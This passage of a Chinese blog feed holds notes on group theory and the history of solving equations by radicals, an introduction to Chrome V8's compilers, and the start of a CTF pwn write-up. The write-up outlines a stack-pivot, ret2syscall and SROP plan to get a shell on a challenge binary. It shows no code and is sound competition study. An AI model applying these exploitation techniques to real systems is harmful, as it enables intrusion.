\mid=\frac{n!}{2}<br>\end{array}<br>$$</p></blockquote><h1 id="循环群">循环群</h1><ul><li>这里将介绍其他群的概念，循环群、生成元、元素的阶</li><li>循环群学过了都说是群中最简单的一类群，在学习循环群时要先来理解一下欧拉函数。</li></ul><h2 id="前提知识">前提知识</h2><blockquote><p><strong>欧拉函数</strong>：<br>$$<br>\begin{array}{l}<br>欧拉函数\phi(n)定义为：小于n且与n互素的非负整数个数<br>\end{array}<br>$$</p></blockquote><ul><li>两个例题练练手：</li></ul><p><img src="/2025/10/17/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E7%BE%A4%E8%AE%BA/image-20250101214344139.png" alt="image-20250101214344139"></p><h2 id="循环群">循环群</h2><ul><li>循环群的定义还是比较好理解的</li></ul><blockquote><p><strong>循环群定义</strong>：<br>$$<br>\begin{array}{l}<br>如果一个群G里的元素都是某一个元素g的幂\则G称为循环群，g称为G的一个生成元。由g生成的循环群记为(g)即G=(g)。<br>\end{array}<br>$$<br><strong>无限循环群可表示为</strong>：<br>$$<br>{···,g^{-2},g^{-1},g^0,g^1,g^2,···}<br>\其中g^0=e<br>$$<br><strong>有限n阶循环群可表示为</strong>：<br>$$<br>{g^0,g^1,g^2,···,g^{n-1}}<br>\其中g^0=e<br>$$</p></blockquote><h2 id="交错群">交错群</h2><h1 id="剩余类群">剩余类群</h1><ul><li>同余、剩余类、剩余类群</li></ul><h1 id="子群">子群</h1><ul><li>接下来介绍一下子群，来进一步了解一下群的性质。</li></ul><h2 id="子群的概念">子群的概念</h2><ul><li>在群中定义了一些群中子集的运算，这里介绍一下。</li></ul><blockquote><p>设G是一个群，A，B是G的非空子1集，g是G的一个元素，我们规定群中子集的运算如下：<br>$$<br>\begin{array}{l}<br>AB={ab|a∈A,b∈B},\<br>A^{-1}={a^{-1}\mid a∈A},\<br>gA={ga\mid a∈A}。\<br>这里要注意一点就是，AA^{-1}并不等于{e},根据第二个公式，AA^{-1}={a_1a_2^{-1}\mid a_1,a_2∈A}<br>\end{array}<br>$$</p></blockquote><ul><li>从群中子集的运算我们引出了子群的概念。</li></ul><blockquote><p><strong>子群</strong>：一个子集内的元素也可以满足群的条件而成为一个群，这就是子群的概念。<br>$$<br>\begin{array}{l}<br>定义：一个群G的一个子集H如果对于G的乘法构成一个群，则称为G的子群。\<br>注意：\对于任意一个群G至少有两个子群:①G本身;②只包含单位元的子集{e}\它们称为G的平凡子群,其他群称为真子群。<br>\end{array}<br>$$</p></blockquote><h1 id="陪集">陪集</h1><ul><li>集合的运算、陪集、拉格朗日定理、子群在群中的指数、</li></ul><h2 id="前置知识">前置知识</h2><ul><li>在了解陪集之前先要了解一下集合与元素的乘法运算以及集合与集合的乘法运算。</li></ul><blockquote><p><strong>集合与元素的乘法运算</strong></p><p>集合A与元素b的乘法运算的结果得到一个新<strong>集合B</strong>，该集合中的元素就是<strong>集合A中的每个元素与元素b的乘积</strong>。</p><p>符号表达为：<br>$$<br>B = bA = { bh \mid h \in A }<br>$$</p></blockquote><blockquote><p><strong>集合与集合的乘法运算</strong></p><p>集合A与集合B的乘法运算的结果得到的仍是一个新<strong>集合C</strong>，该集合中的元素就是<strong>集合A中的每个元素与集合B中的每个元素的乘积</strong></p><p>符号表达为：<br>$$<br>C = AB =\left {ab|a∈A,b∈B\right }<br>$$</p></blockquote><ul><li>知道集合与元素的乘法运算之后，这边介绍该运算中在群中的两个性质。</li></ul><blockquote><p><strong>性质一</strong>：</p><p>设G是一个群。<br>$$<br>aG = \left{ ah \mid h \in G \right} = G<br>$$<br>证明思路就去证明:<br>$$<br>aG\subseteq G和G\subseteq aG<br>$$</p></blockquote><blockquote><p><strong>性质二</strong>：</p><p>设G是一个群。<br>$$<br>GG=\left {ah|h∈G，a∈G\right }=G<br>$$</p></blockquote><h2 id="陪集的定义">陪集的定义</h2><ul><li>了解了前置知识后再来了解陪集的定义。</li></ul><blockquote><p><strong>陪集的定义</strong>：</p><p><strong>左陪集</strong>：<br>$$<br>\begin{array}{l}<br>设H是群G的一个子群。对于任意a∈G，集合\aH={ah\mid h∈H}\称为H的一个左陪集，记为aH。<br>\end{array}<br>$$<br><strong>右陪集</strong>：<br>$$<br>\begin{array}{l}<br>设H是群G的一个子群。对于任意a∈G，集合\Ha={ha\mid h∈H}\称为H的一个右陪集，记为Ha。<br>\end{array}<br>$$<br><strong>注意</strong>：对于交换群(即阿贝尔群)，左陪集和右陪集是一致的，可以称为陪集。</p><p><strong>特别地1</strong>：<br>$$<br>\begin{array}{l}<br>当a∈H时有：aH=H,则H也是自己的一个左陪集。\<br>同理H也是自己的右陪集。<br>\end{array}<br>$$<br><strong>特别地2</strong>：<br>$$<br>\begin{array}{l}<br>左右陪集都可由aH中的任意一个元素唯一确定。<br>\假设:b∈aH,即b=ah(h∈H)<br>\即：bH=ahH=a(hH)=aH。\右陪集也同理可证。<br>\end{array}<br>$$</p></blockquote><h1 id="正规子群和商群">正规子群和商群</h1>]]></content>
    
    
    <summary type="html">太抽象了</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="抽象代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>抽象代数-前言</title>
    <link href="http://iyheart.github.io/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/"/>
    <id>http://iyheart.github.io/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/</id>
    <published>2025-10-16T09:13:54.000Z</published>
    <updated>2025-10-17T07:01:38.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="参考资料">参考资料</h1><p><img src="/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/image-20251017145845958.png" alt="image-20251017145845958"></p><p><img src="/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/image-20251017145915237.png" alt="image-20251017145915237"></p><p><img src="/2025/10/16/%E6%95%B0%E5%AD%A6blog/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0-%E5%89%8D%E8%A8%80/image-20251017150120286.png" alt="image-20251017150120286"></p><h1 id="关于抽象代数">关于抽象代数</h1><ul><li><p>抽象代数算是距离现在年代比较近产生的数学理论，并且在数学和计算机以及密码学这块是非常重要的。所以学好抽象代数很重要。</p></li><li><p>学习抽象代数，其最核心的定理是<strong>Galois大定理</strong>：一个特征为0的域F上的n次方程在F上根式可解当前仅当它在F上的Galois群是可解群。</p></li><li><p>从核心定理其实就可以知道抽象代数围绕的问题是<strong>n次方程根式可解</strong>这一问题。</p></li><li><p>学习抽象代数的很多内容其实都是在为<strong>Galois</strong>大定理的理解和证明做铺垫，在理解<strong>Galois</strong>大定理的时候就需要理解如下的知识，并且在证明它的时候需要用到很多定理，这些知识和定理其实就占了抽象代数的一大半：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">对于理解该大定理首先要理解：域、域的特征、Galois群、可解群、根式可解。而需要理解这些还需要一定的前置知识</span><br><span class="line">域 </span><br><span class="line">域的特征</span><br><span class="line">Galois群--&gt; 群 --&gt; 自同构</span><br><span class="line">可解群--&gt; 正规子群 </span><br><span class="line">根式可解--&gt; 根式扩张 --&gt; 域扩张</span><br></pre></td></tr></table></figure><h1 id="抽象代数极简史">抽象代数极简史</h1><ul><li>前期：<code>1760</code>年之前<ul><li>小于等于四次方程的解法，从<code>2、3、4</code>次方程都有求根公式，这样就产生了一个问题，5次及以上的方程是否也有求根公式</li><li>根于系数的关系，韦达定理，一般方程的根与系数关系是有<code>Girard</code>证明</li><li>利莫佛公式与n次单位根</li><li>代数学基本定理，<code>Girard</code>证明了根的存在定理。即：复数域上任何一个非0次多项式，一定有根并且根都在复数域中，并且在数重数的意义下根的个数与次数相同。</li></ul></li><li>中期：<code>1760</code>~<code>1798</code>年之间<ul><li><code>Bézout</code>：用n次单位根表示n次方程的根</li><li><code>Lagnage(拉格朗日)</code>：考察了小于等于4的各种解法，总结了这些解法的特点；考察这些解法为什么会产生根，从而提出了造根原理。</li><li><code>Vander monde(范德蒙)</code>：把根表示成根的对称表达式$x_{1,2}=\frac{1}{2}[(x_1+x_2)\pm\sqrt{(x_1+x_2)^2-4x_1x_2}]$，对根的置换也进行了大量的计算，根重要的是范德蒙求出了11次单位根的根式表达式。</li><li><code>Gauss(高斯)</code>：建立了分圆理论，证明了一般的n次单位根的根式表示</li></ul></li><li>后期：<code>1799</code>~<code>1829</code>年<ul><li><code>Ruffini</code>：<strong>第一次证明</strong>了大于等于5次一般方程没有求根公式，但是该证明存在漏洞，并且该证明有500多页。</li><li><code>Abel(阿贝尔)</code>：独立与<code>Ruffini</code>第一个完整证明大于等于5次的一般方程没有求根公式(1824年)；</li><li><code>Abel</code>：当特征为0的域F上的多项式是Galois群是交换群时这个方程一定可以根式解。</li></ul></li><li>产生：<code>1830~1832</code>年<ul><li><code>Galois</code>：提出了<code>Galois</code>大定理。</li></ul></li></ul><h1 id="抽象代数简史">抽象代数简史</h1><ul><li>抽象代数的简史分为前期、中期、后期以及产生。先来了解一下抽象代数的历史会更有助于理解和学习抽象代数。</li></ul><h2 id="前期">前期</h2><h3 id="求根公式">求根公式</h3><p>小于等于4次方程的原始解法。</p><ul><li><p>一次$ax+b=0,a≠0$，除首项系数：$x+\frac{b}{a}=0$，移项得到：$x=-\frac{b}{a}$</p></li><li><p>二次$ax^2+bx+c=0,a≠0$：</p><ul><li>除首项系数：$x^{2}+\frac{b}{a}x+\frac{c}{a}=0$</li><li>配方：$(x+\frac{b}{2a})^2-\frac{b^2}{4a^2}+\frac{c}{a}=0$</li><li>移项：$(x+\frac{b}{2a})^2=\frac{b^2-4ac}{4a^2}$</li><li>开方：$x+\frac{b}{2a}=\pm\frac{\sqrt{b^2-4ac}}{2a}$</li></ul></li><li><p>三次$ax^3+bx^2+cx+d=0,a≠0$，<code>Girard</code>等解法：</p><ul><li>同样是除首项系数，那其实就直接设<code>a=1</code>，即方程$x^3+bx^2+cx+d=0$</li><li>变换$x=y-\frac{b}{3}$：带入可以消二次项系数，即$y^3+py+q=0$</li><li>增加变量令<code>y=u+v</code>代入：$u^3+v^3+3uv(u+v)+p(u+v)+q=0$部分因式分解可得$u^3+v^3+(u+v)(3uv+p)+q=0$</li><li>令$3uv+p=0$，从而化简方程：$u^3+v^3+q=0$，这样利用$3uv+p=0$可以解出$v=-\frac{p}{3u}$，带入方程可以得到$u^3+(-\frac{p}{3u})^3+q=0$，化简得$u^6+qu^3-(\frac{p}{3})^3=0$是关于$u^3$的一个二次方程</li><li>利用求根公式可以得到$u^3=-\frac{q}{2}\pm\sqrt{(\frac{q}{2})^2+(\frac{p}{3})^3}$</li><li>从而可以得到$x=u+v-\frac{b}{3},(a=1)$</li></ul></li><li><p>四次方程，Ferrari解法$x^4+ax^3+bx^2+cx+d=0$</p><ul><li>用变换$x=y-\frac{a}{4}$消三次项系数得到$y^4+py^2+qy+r=0$</li><li>配方：$(y^2+\frac{p}{2})^2=\frac{p^2}{4}-qy-r$</li><li>增加变量，在配方左边的式子增加变量：$(y^2+\frac{p}{2}+u)=\frac{p^2}{4}-qy-r+u^2+2uy^2+pu$</li><li>增加了变量，有了自由度，选取一个u将右边凑平方，右边通过将<code>y</code>作为主元，得到y的二次方程令$\Delta=q^2-8u(\frac{p^2}{4}-r+u^2+pu)=0$得到关于<code>u</code>的3次方程，由于三次方程已经有求根公式，这样可以根式解出u</li><li>从而第三步所得方程就可以变成$(y^2+\frac{p}{2}+u)^2=2u(y^2-\frac{q}{2u}y+(\frac{q}{4u})^2)$，从而可以得到$y^2+\frac{p}{2}+u=\pm\sqrt{2u}(y-\frac{q}{4u})$</li><li>转化为关于y的的二次方程，可以根式解出y</li></ul></li></ul><p>小于等于4次方程的其他解法（都考虑首项系数为1）</p><ul><li><p><code>Viete(韦达)</code>的三次方程解法：$x^3+px+q=0$：</p><ul><li>令$x=\frac{p}{3y}-y$，带入可以得到$y^6-qy^3-(\frac{p}{3})^3=0$</li><li>解出$y^3=\frac{q}{2}\pm\sqrt{(\frac{q}{2})^2+(\frac{p}{3})^3}$</li></ul></li><li><p><code>Descarte(笛卡尔)</code>的四次方程解法：$x^4+px^2+qx+r=0$</p><ul><li>分解：$x^4+px^2+qx+r=(x^2+kx+u)(x^2-kx+v)$</li><li>这样直接乘开得到$x^4+px^2+qx+r=x^4+(u+v-k^2)x^2+k(u-v)x+uv=0$</li><li>这样直接用待定系数法：$p=u+v-k^2$，$q=k(u-v)$，$r=uv$，联立解得$u=\frac{1}{2}(k^2+p-\frac{q}{k})$，$v=\frac{1}{2}(k^2+p+\frac{q}{k})$</li></ul></li><li><p><code>Tschirnhaus(契恩豪斯解法)</code>解一般的n次方程：$x^n+a_{n-1}x^{n-1}+…+a_1x+a_0=0$</p><ul><li>令$y=x^{n-1}+b_nx^{n-2}+…+b_1x+b_0$，这样就可以消掉x得到关于y的一个n次方程：$y^n+c_{n-1}y^{n-1}+…+c_1y+c_0=0$</li><li>取非常好的$b_i$使得$c_{n-1}=…=c_1=0$，从而$y^n+c_0=0$于是$y=-\sqrt[n]{c_0}$，契恩豪斯断言其解法对一般的n成立，其只测试了<code>n=3</code></li><li>事实上<code>n-1</code>个方程能决定<code>n-1</code>个变量，但由<code>Bézout</code>的消去理论，一般要解一个<code>(n-1)!</code>次的方程</li></ul></li></ul><h3 id="棣莫弗公式">棣莫弗公式</h3><ul><li><p><code>e Moivre</code>公式与<code>n</code>次单位根：$(cos\theta+isin\theta)^n=cos(n\theta)+isin(n\theta)$，即欧拉公式$(e^{i\theta})^n=e^{i(n\theta)}$</p></li><li><p>利用棣莫弗公式就可以解方程：$z^n=1=cos\theta+isin\theta$，可以得到$\theta=\frac{2k\pi}{n},\omega_k=cos(\frac{2k}{n})+isin(\frac{2k\pi}{n}),k=0,1,…n-1$，这里称$z^n-1=0$的解为n次单位根</p></li><li><p>n次单位根的根式表示：使用棣莫弗公式就可以将n次单位根的根式表示化为n是素数时，$z^n-1=\Pi^{n-1}_{k=0}(z-w_k)$</p></li><li><p>根与系数的关系，并且衍生出对称多项式：</p><ul><li><code>Viete(韦达)</code>：强调方程的结构即根与系数的关系，并且证明了二次、三次方程的根与系数的关系</li><li><code>Girard(吉拉德)</code>：证明了n次方程的根与系数的关系$z^n+a_1z^{n-1}+…+a_{n-1}z+a_0=0$的n个根满足</li></ul><p>$$<br>s1 = x_1+x_2+…+x_n=-a_1\<br>s2 = x_1x_2+x_1x_3+…+x_{n-1}x_n=a_2\<br>…\<br>s_n = x_1x_2…x_n = (-1)^{n}a_n<br>$$</p><ul><li><code>Girard</code>开始研究对称多项式，三元对称多项式$x^2_1+x^2_2+x^2_3$，之后又有<code>牛顿等人</code>，设$s1、s_2、…、s_n$的为$x_1、x_2、…、x_n$的初等对称多项式</li><li><code>Vander monde(范德蒙)</code>证明了对称多项式定理，一个域F上关于n个不定元$x_1、x_2、…、x_n$的多项式<code>f</code>可以表示成$s_1、s_2、…、s_n$的多项式当前仅当<code>f</code>关于$x_1、x_2、…、x_n$的置换不变。即$f(x_1,x_2,x_3)=f(x_2,x_1,x_3)$</li></ul></li></ul><h3 id="代数学基本定理">代数学基本定理</h3><ul><li><p><code>Girard</code>根的存在定理：域F上的一个n次多项式<code>(n≥1)</code>的多项式<code>p(x)</code>在F的某个扩域K上可以分解成$p(x)=a(x-a_1)…(x-a_n),a,a_1,…a_n\in K$</p></li><li><p>代数学基本定理：复数域<code>C</code>是代数封闭的，即C上的任何非0多项式的根均在C中，而且在计重数的意义下方程的根的个数等于方程的次数。</p><ul><li>该定理的第一个证明是由<code>d'Alembert</code>给出的，但是他没有证明根的个数等于方程的次数，第一个完整的证明是<code>Gaauss</code>给出的</li><li>欧拉尝试代数的证明，而<code>Fonceneux</code>进行改进，最后拉格朗日给出第一个严格的证明</li></ul></li></ul><h2 id="中期">中期</h2><p>四个具有代表性的人的工作。</p><h3 id="bezout">Bezout</h3><ul><li><p><code>Bezout</code>用n次单位根表几次方程的根。</p><ul><li><p>消去方程的中间变量<code>y</code>，可以得到关于<code>x</code>的一个<code>n</code>次方程$R_n(x)=0$，且$R_n(x)$的系数可以用$a_0,…,a_{n-1}$表示出来。：<br>$$<br>\begin{equation}<br>\begin{cases}<br>x = a_0 + a_1y + … +a_{n-1}y^{n-1} \<br>y^n = 1<br>\end{cases}<br>\end{equation}<br>$$</p></li><li><p>$R_n(x)=0$的根，当$y=\omega_k$是一个<code>n</code>次单位根时，有$w_k=e^{\frac{2k\pi i}{n}}$，能找到$x_k = a_0+a_1w_k+…+a_{n-1}w_k^{n-1}$是$R_n(x)=0$的根。得到$R_n(x)=\Pi^{n-1}_{k=0}(x-x_k)$</p></li><li><p>解n次方程$P(x)=0$：找合适的$a_0,a_1,…,a_{n-1}$，使得$R_n(x)=P(x)$，从而$P(x)$的根为$x_1,…,x_n$，其中$x_n=a_0+a_1\omega_k+…+a_{n-1}\omega_k^{n-1}$</p></li><li><p>注意：<code>Bezout</code>只证明了<code>n=2,3,4</code>的情况</p></li></ul></li></ul><h3 id="lagrange">Lagrange</h3><ul><li><p><code>Lagrange</code>划时代的工作：</p><ol><li><p>回顾总结了前面$n≤4$次方程的解法。共同点：通过一个巧妙的变换化为一个地刺的辅助方程</p></li><li><p>探求这些解法产生根的机制，本质上要把辅助方程的根表为原方程的根的有理函数，还发现了造根原理，相对的造根原理。</p></li><li><p>提出了<code>Lagrange</code>预解式。</p></li></ol></li><li><p><code>Lagrange</code>的深思：</p><ol><li>在造根原理的促进下，发现了群论和<code>Galois</code>理论的早期结果。</li><li>研究<code>Lagrange</code>预解式的性质并设计了用来根式解方程的方案。</li><li>一般的<code>n≥5</code>次方程可能没有求根公式。</li></ol></li></ul><h3 id="vander-monde">Vander monde</h3><ul><li><p>把根用根的对称函数表示比如：二次方程：$x_{1,2}=\frac{1}{2}[(x+n)\pm\sqrt(x_1+x_2)^{2}-4x_1x_2]$</p></li><li><p>设计方案如下：</p><ul><li>找到一个根的函数是我们一般意义上的根。（已经证明了）</li><li>根的函数关于根的置换是对称的。（只证明了<code>n=2,3,4</code>）</li><li>带入根的和，以及两两乘积的和（方程的系数）根的函数就是方程的根。</li></ul></li><li><p>对根的置换进行了大量的计算。</p></li><li><p>提出了<code>Vander monde</code>预解式。</p></li><li><p>11次单位根用根式表示</p></li><li><p>为了解一个方程的结构，只需考察那些保持根的关系的置换</p></li></ul><h3 id="gauss">Gauss</h3><p>Gauss主要是分圆理论。</p><ul><li><code>n</code>次单位根的根式表示：在<code>Vander monde</code>的基础上引入了循环置换，以及根之间的关系</li><li>正<code>n</code>边形的尺规作图问题：正<code>n</code>边形可以用尺规作出来当且仅当<code>n</code>的素因子只能是<code>2</code>或者<code>Fermat</code>素数。注：形为$2^m+1$数如果是素数，那么则称该素数为<code>Fermat</code>素数。</li><li>高斯的这一套理论适用预其他的超越函数类。</li></ul><h2 id="后期与产生">后期与产生</h2>]]></content>
    
    
    <summary type="html">前言：抽代学的不好，重新学习抽象代数</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="抽象代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Chrome v8学习1</title>
    <link href="http://iyheart.github.io/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/"/>
    <id>http://iyheart.github.io/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/</id>
    <published>2025-10-12T16:20:52.000Z</published>
    <updated>2025-10-19T11:59:28.939Z</updated>
    
    <content type="html"><![CDATA[<h1 id="资料收集">资料收集</h1><ul><li>参考博客：<a href="https://www.cnblogs.com/ai888/p/18607673">请说下V8、chrome、chromium三者之间的关系 - 王铁柱6 - 博客园</a></li><li>参考文章：<a href="https://zh.wikipedia.org/wiki/%E5%8D%B3%E6%99%82%E7%B7%A8%E8%AD%AF">即时编译 - 维基百科，自由的百科全书</a></li><li>参考课件：<a href="https://github.com/plctlab/v8-internals">plctlab/v8-internals: 面向编译器开发人员的V8内部实现文档</a></li><li>V8github仓库链接：<a href="https://github.com/v8/v8">v8/v8: The official mirror of the V8 Git repository</a></li></ul><h1 id="初步了解">初步了解</h1><p><code>chrome v8</code>是Google开发的开源高性能<code>JavaScript</code>和<code>WebAssembly</code>引擎，使用<code>C++</code>编写。</p><ul><li><code>V8</code>负责执行<code>JavaScript</code>代码，管理内存，以及进行垃圾回收。</li><li><code>V8</code>引擎通过即时编译技术<code>JIT</code>技术优化代码执行效率，先将<code>JavaScript</code>源码转换为抽象语法树<code>(AST)</code>，再转换为字节码，最终编译成优化的机器码执行。</li><li><code>V8</code>可以独立运行，也可以<strong>嵌入到任何C++应用程序中</strong>，最著名的应用方案就是<code>Node.js</code></li></ul><h2 id="chrome-v8发展">chrome v8发展</h2><ul><li>2008年<code>V8</code>发布了第一个版本，其性能远超同时期其他<code>js</code>解释器，例如：<code>SpiderMonkey</code>、<code>JavaScriptCore</code>。但是此时的<code>V8</code>是直接将<code>js</code>源码直接编译成机器码再执行，此时<code>v8</code>只有<code>Codegen</code>一个编译器，对于代码优化功能比较有限。（具体的过程先不深究）</li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013005547390.png" alt="image-20251013005547390"></p><ul><li>2010年<code>v8</code>发布了另一个编译器，也就是<code>Crankshaft</code>编译器。其工作原理如下：<ul><li><code>Js</code>函数通常会被<code>Full-Codegen</code>编译</li><li>如果后续该函数会被多次执行，那么就会用<code>Crankshaft</code>再重新编译，生产优化代码。但是<code>Crankshaft</code>对代码的优化有限</li></ul></li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013082414157.png" alt="image-20251013082414157"></p><ul><li>2015年<code>v8</code>又再发布了一个<code>优化编译器</code>，<code>TurboFan</code>。此时的<code>v8</code>依旧是将源码编译为机器码的架构。这个架构存在的一个问题就是内存消耗较大，尤其是在移动设备上。</li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013082838403.png" alt="image-20251013082838403"></p><ul><li>2016年<code>v8</code>的架构开始改变，引入了<code>Ignition</code>解释器，重新引入字节码，减少内存使用。</li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013082926474.png" alt="image-20251013082926474"></p><ul><li>2017年<code>v8</code>发布全新编译的<code>pipeline</code>，其架构如下图所示。<ul><li>从<code>v8 5.9</code>版本去除了<code>Full-Codegen</code>以及<code>Crankshaft</code>编译器。</li><li>现在这个架构最核心有三个，分别是<strong>解析器</strong>、<strong>解释器</strong>、<strong>优化编译器</strong></li><li>简单介绍一下该架构下<code>js</code>的执行过程，首先解析器会将<code>js</code>代码解析成抽象语法树（AST），解释器再将（AST）翻译为字节码边解释边执行。</li><li>在解释过程中，解释器还提供记录特定代码片段运行次数的功能，当特定代码运行次数达到一定程度时，会将该代码片段标记为<strong>热代码</strong>，并反馈给优化编译器<code>TurboFan</code>。</li><li><code>TurboFan</code>根据反馈信息<strong>优化并编译字节码</strong>，最终生成机器码，当再次执行该段代码时，就会直接使用优化后的机器码。</li></ul></li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251013083039441.png" alt="image-20251013083039441"></p><h2 id="chrome-v8版本号">Chrome v8版本号</h2><ul><li>直接打开<code>谷歌浏览器</code>，输入网址<code>chrome://version/</code>，会看到<code>V8</code>的版本以及谷歌浏览器的版本。<code>V8</code>的版本号定义形如<code>x.y.z.w</code><ul><li>其中<code>x.y</code>是由谷歌浏览器的主版本号除以<code>10</code>得到的，比如图中的谷歌浏览器主版本号为<code>143</code>除以<code>10</code>就是<code>14.3</code>。</li><li>而<code>z</code>每出现新的 <strong>LKGR</strong>（Last Known Good Revision）（最后一个已知良好版本）时自动递增。</li><li>而<code>w</code>分支点后回合并补丁次数（其实就相当于补丁号）</li></ul></li></ul><p><img src="/2025/10/13/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Chrome%20v8/Chrome-v8%E5%AD%A6%E4%B9%A01/image-20251014155741323.png" alt="image-20251014155741323"></p><h2 id="parser解析器">Parser解析器</h2><h2 id="ignition解释器">Ignition解释器</h2><h2 id="turbofan优化编译器">TurboFan优化编译器</h2><h1 id="chrome-v8项目文件架构">Chrome V8项目文件架构</h1>]]></content>
    
    
    <summary type="html">前言：v8是个大项目，没有v8基础去找洞和做题，我不会，遂学习。</summary>
    
    
    
    <category term="开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="v8" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/v8/"/>
    
    
  </entry>
  
  <entry>
    <title>DASCTF2025上半年赛</title>
    <link href="http://iyheart.github.io/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/"/>
    <id>http://iyheart.github.io/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/</id>
    <published>2025-10-12T12:10:05.000Z</published>
    <updated>2025-10-12T12:23:03.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn">PWN</h1><h2 id="mini">mini</h2><ul><li><p>考点：<code>only-read</code></p></li><li><p>这题与<code>ACTF</code>的那题是一样的题型都是<code>only-read</code>的题型，只不过这题溢出的字节数非常小，只有<code>0x20</code>字节，而<code>ACTF</code>那题溢出的字节数非常大。</p></li><li><p>先来查看一下程序保护机制。没有开启<code>PIE</code>和<code>canary found</code>。</p></li></ul><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623013520561.png" alt="image-20250623013520561"></p><ul><li>然后查看一下这个程序的主要代码，发现只能溢出到<code>ret</code>这个部分。所以这题必须栈迁移。</li></ul><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623013611664.png" alt="image-20250623013611664"></p><ul><li>此时还发现了<code>pop rax ret</code>这个<code>gadget</code>，那这题的思路还是比较明显的，思路为<code>ret2syscall</code>利用<code>SROP</code>从而<code>getshell</code>，返回到的是<code>__libc_start_call_main</code>这个函数中的一个<code>syscall</code>。</li></ul><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623013712291.png" alt="image-20250623013712291"></p><ul><li>首先我们先来栈迁移，将栈内存迁移到<code>bss</code>段中，但是由于<code>bss</code>段上还没有<code>libc</code>地址，所以此时迁移之后还需要返回到<code>_start</code>将程序从头开始运行，这时<code>bss</code>段上就有相关的数据。如下图：</li></ul><p><img src="/2025/10/12/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/DASCTF2025%E4%B8%8A%E5%8D%8A%E5%B9%B4%E8%B5%9B/image-20250623014811504.png" 